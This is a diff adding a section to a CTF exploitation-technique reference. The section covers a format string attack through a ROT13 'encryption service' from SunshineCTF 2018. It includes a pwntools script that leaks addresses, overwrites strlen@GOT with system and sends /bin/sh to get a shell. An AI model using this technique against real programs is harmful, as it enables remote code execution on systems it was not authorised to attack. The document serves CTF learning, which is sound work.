@@ -18,6 +18,7 @@
 - [strlen Integer Truncation Bypass (ASIS CTF Finals 2017)](#strlen-integer-truncation-bypass-asis-ctf-finals-2017)
 - [printf_function_table Overwrite via Buffer Overflow (34C3 CTF 2017)](#printf_function_table-overwrite-via-buffer-overflow-34c3-ctf-2017)
 - [scanf Format String on Stack Overwrite (TUCTF 2017)](#scanf-format-string-on-stack-overwrite-tuctf-2017)
+- [Format String Exploit Through ROT13 Encoding (SunshineCTF 2018)](#format-string-exploit-through-rot13-encoding-sunshinectf-2018)
 
 ---
 
@@ -608,3 +609,52 @@ io.sendline(payload1)
 **When to recognize:** Binary uses `scanf` with a format string that limits input length (e.g., `%30s`), but the overflow is just short of reaching the return address. If the format string is a local variable on the stack rather than a string literal, this two-stage technique bridges the gap.
 
 **References:** TUCTF 2017
+
+---
+
+## Format String Exploit Through ROT13 Encoding (SunshineCTF 2018)
+
+**Pattern:** A "ROT13 encryption service" applies ROT13 to user input before passing it to `printf`. Leak addresses and build format string payloads, but ROT13-encode them first so they survive the transformation and reach `printf` intact.
+
+**Attack chain:**
+1. Input is ROT13-encoded by the binary before reaching `printf`
+2. ROT13 is self-inverse: `rot13(rot13(x)) = x`
+3. Pre-encode format string payloads with ROT13 so the transformation produces the intended format specifiers
+4. Leak libc and program addresses via ROT13-encoded `%p` specifiers
+5. Build a `fmtstr_payload` to overwrite `strlen@GOT` with `system`, then send `/bin/sh`
+
+```python
+import codecs
+from pwn import *
+
+def rot13(s):
+    return codecs.encode(s, 'rot_13')
+
+io = remote('target', 1337)
+
+# Stage 1: Leak addresses through ROT13 transform
+# rot13('%2$x|%3$x') produces encoded string; after binary's rot13, printf sees '%2$x|%3$x'
+io.sendline(rot13('%2$x|%3$x').encode())
+leak = io.recvline().decode()
+libc_leak, prog_leak = leak.split('|')
+libc_base = int(libc_leak, 16) - known_offset
+prog_base = int(prog_leak, 16) - known_offset
+
+# Stage 2: Overwrite strlen@GOT with system via format string
+strlen_got = prog_base + elf.got['strlen']
+system_addr = libc_base + libc.symbols['system']
+writes = {strlen_got: system_addr}
+payload = fmtstr_payload(7, writes)
+
+# ROT13-encode the entire payload so binary's rot13 produces the real fmt string
+encoded_payload = rot13(payload.decode('latin-1')).encode('latin-1')
+io.sendline(encoded_payload)
+
+# Stage 3: Send /bin/sh -- strlen("/bin/sh") now calls system("/bin/sh")
+io.sendline(b'/bin/sh')
+io.interactive()
+```
+
+**Key insight:** When input is transformed before reaching printf (ROT13, Caesar, etc.), pre-encode the format string payload with the inverse transform. ROT13 is self-inverse, so `rot13(rot13(payload)) = payload` reaches printf intact. This applies to any invertible transformation applied before a format string sink -- XOR, base64, substitution ciphers, etc.
+
+**References:** SunshineCTF 2018
